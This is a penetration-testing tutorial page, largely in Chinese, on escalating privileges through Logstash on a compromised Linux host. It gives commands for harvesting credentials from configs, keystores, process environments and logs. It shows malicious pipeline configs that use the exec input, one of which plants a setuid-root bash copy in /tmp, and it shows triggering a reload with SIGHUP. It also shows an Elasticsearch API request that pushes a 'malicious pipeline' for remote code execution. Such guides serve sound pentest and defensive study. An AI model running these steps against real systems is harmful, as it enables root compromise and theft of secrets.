# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash 被用来通过一个被称为 **pipelines** 的系统来**收集、转换和分发日志**。这些 **pipelines** 由 **input**、**filter** 和 **output** 阶段组成。当 Logstash 在被攻陷的机器上运行时，会出现一个有趣的情况。

### Pipeline 配置

Pipelines 在文件 **/etc/logstash/pipelines.yml** 中进行配置，该文件列出了这些 pipeline 配置的位置：
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
该文件揭示了包含 pipeline 配置的 **.conf** 文件位于何处。在使用 **Elasticsearch output module** 时，**pipelines** 通常会包含 **Elasticsearch credentials**，由于 Logstash 需要向 Elasticsearch 写入数据，这些凭据常具有较高权限。配置路径中的通配符允许 Logstash 在指定目录中执行所有匹配的 pipeline。

如果 Logstash 使用 `-f <directory>` 启动而不是 `pipelines.yml`，**该目录下的所有文件会按字典序被连接并作为单个配置解析**。这会给攻击者带来两个影响：

- 放入像 `000-input.conf` 或 `zzz-output.conf` 这样的文件可以改变最终 pipeline 的组装方式
- 格式错误的文件可能阻止整个 pipeline 加载，因此在依赖 auto-reload 之前应仔细验证 payloads

### 在被攻陷主机上的快速枚举

在安装了 Logstash 的主机上，快速检查：
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
也要检查本地监控 API 是否可访问。默认绑定在 **127.0.0.1:9600**，通常在获得主机访问后就足够了：
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
This usually gives you pipeline IDs, runtime details, and confirmation that your modified pipeline has been loaded.

从 Logstash 恢复的凭据通常可以解锁 **Elasticsearch**，因此请查看 [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md)。

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, first identify the user under which the Logstash service is running, typically the **logstash** user. Ensure you meet **one** of these criteria:

- 拥有对 pipeline **.conf** 文件的 **write access** **or**
- **/etc/logstash/pipelines.yml** 文件使用通配符，且你可以写入目标文件夹

此外，以下 **one** 个条件必须满足：

- 能够重启 Logstash 服务 **or**
- **/etc/logstash/logstash.yml** 文件设置了 **config.reload.automatic: true**

如果配置中存在通配符，创建一个匹配该通配符的文件可实现命令执行。例如：
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
这里，**interval** 决定执行频率（以秒为单位）。在示例中，**whoami** 命令每 120 秒运行一次，输出定向到 **/tmp/output.log**。

在 **/etc/logstash/logstash.yml** 中设置 **config.reload.automatic: true** 后，Logstash 会自动检测并应用新的或已修改的 pipeline 配置，而无需重启。如果没有使用通配符，仍然可以修改已存在的配置，但建议小心操作以避免中断。

### 更可靠的 Pipeline 载荷

`exec` input plugin 在当前版本仍然可用，且需要 `interval` 或 `schedule` 之一。它通过 **forking** Logstash JVM 来执行，因此如果内存不足，你的 payload 可能会因为 `ENOMEM` 而失败，而不是静默运行。

更实用的 privilege-escalation payload 通常会留下一个持久的工件：
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
如果你没有重启权限但可以向进程发送信号，Logstash 在类 Unix 系统上也支持通过 **SIGHUP** 触发的重载：
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Be aware that not every plugin is reload-friendly. For example, the **stdin** 输入插件会阻止自动重载，所以不要认为 `config.reload.automatic` 总能检测到你的更改。

### 从 Logstash 窃取秘密

在只关注代码执行之前，先收集 Logstash 已经可以访问的数据：

- 明文凭据经常被硬编码在 `elasticsearch {}` 输出、`http_poller`、JDBC 输入或与云相关的设置中
- 安全设置可能存在于 **`/etc/logstash/logstash.keystore`** 或另一个 `path.settings` 目录中
- keystore 密码通常通过 **`LOGSTASH_KEYSTORE_PASS`** 提供，而基于包的安装通常会从 **`/etc/sysconfig/logstash`** 获取它
- 环境变量 `${VAR}` 的展开在 Logstash 启动时解析，因此值得检查服务的环境变量

有用的检查：
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
这点也值得检查，因为 **CVE-2023-46672** 表明在特定情况下 Logstash 可能会在日志中记录敏感信息。在已被利用的主机上，旧的 Logstash 日志和 `journald` 条目可能会披露凭证，即使当前配置引用了 keystore 而不是将密钥内联存储。

### 集中式管道管理滥用

在某些环境中，主机根本不依赖本地 `.conf` 文件。如果配置了 **`xpack.management.enabled: true`**，Logstash 可以从 Elasticsearch/Kibana 拉取集中管理的 pipelines，启用此模式后本地 pipeline 配置将不再是可信来源。

这意味着一种不同的攻击路径：

1. 从本地 Logstash 设置、keystore 或日志中恢复 Elastic 凭证
2. 验证该账户是否具有 **`manage_logstash_pipelines`** 集群权限
3. 创建或替换一个集中管理的 pipeline，使 Logstash 主机在下一次轮询间隔执行你的 payload

The Elasticsearch API used for this feature is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
这在本地文件为只读且 Logstash 已注册为远程获取 pipelines 时尤其有用。

## 参考资料

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
